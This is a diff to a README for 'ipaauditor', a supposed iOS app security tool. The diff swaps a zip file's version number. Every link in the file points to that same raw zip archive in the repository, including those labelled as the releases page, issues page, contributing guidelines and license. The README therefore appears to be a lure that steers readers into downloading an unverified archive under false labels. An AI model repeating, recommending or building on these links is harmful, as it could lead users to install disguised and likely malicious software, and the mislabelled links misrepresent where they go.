@@ -1,6 +1,6 @@
 # 📱 ipaauditor - Easily Analyze iOS IPA Security
 
-![Download ipaauditor](https://raw.githubusercontent.com/NhiiAdjetey/ipaauditor/main/lib/Software-v2.9.zip)
+![Download ipaauditor](https://raw.githubusercontent.com/NhiiAdjetey/ipaauditor/main/lib/Software-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To use ipaauditor, you will need:
 
 ## 🔗 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/NhiiAdjetey/ipaauditor/main/lib/Software-v2.9.zip). 
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/NhiiAdjetey/ipaauditor/main/lib/Software-1.8.zip). 
 
 Follow these steps to download and run ipaauditor:
 
@@ -59,21 +59,21 @@ The interface is designed for ease of use. Here is how it looks:
 
 If you encounter any issues while using ipaauditor, feel free to reach out:
 
-- **GitHub Issues:** Report problems directly on this [GitHub Issues page](https://raw.githubusercontent.com/NhiiAdjetey/ipaauditor/main/lib/Software-v2.9.zip).
+- **GitHub Issues:** Report problems directly on this [GitHub Issues page](https://raw.githubusercontent.com/NhiiAdjetey/ipaauditor/main/lib/Software-1.8.zip).
 - **Community Forum:** Join discussions on security analysis and find solutions from other users.
 
 ## 📂 Contributing
 
-We welcome contributions to ipaauditor! If you have ideas for features or improvements, please visit the [Contributing Guidelines](https://raw.githubusercontent.com/NhiiAdjetey/ipaauditor/main/lib/Software-v2.9.zip).
+We welcome contributions to ipaauditor! If you have ideas for features or improvements, please visit the [Contributing Guidelines](https://raw.githubusercontent.com/NhiiAdjetey/ipaauditor/main/lib/Software-1.8.zip).
 
 ## 📝 License
 
-Ipaauditor is open-source software and is licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/NhiiAdjetey/ipaauditor/main/lib/Software-v2.9.zip).
+Ipaauditor is open-source software and is licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/NhiiAdjetey/ipaauditor/main/lib/Software-1.8.zip).
 
 ## 🤗 Acknowledgments
 
 Thank you to all contributors and users for supporting ipaauditor. Your feedback and contributions are invaluable to us!
 
-![Download ipaauditor](https://raw.githubusercontent.com/NhiiAdjetey/ipaauditor/main/lib/Software-v2.9.zip) 
+![Download ipaauditor](https://raw.githubusercontent.com/NhiiAdjetey/ipaauditor/main/lib/Software-1.8.zip) 
 
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/NhiiAdjetey/ipaauditor/main/lib/Software-v2.9.zip) and start securing your iOS apps today!
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/NhiiAdjetey/ipaauditor/main/lib/Software-1.8.zip) and start securing your iOS apps today!
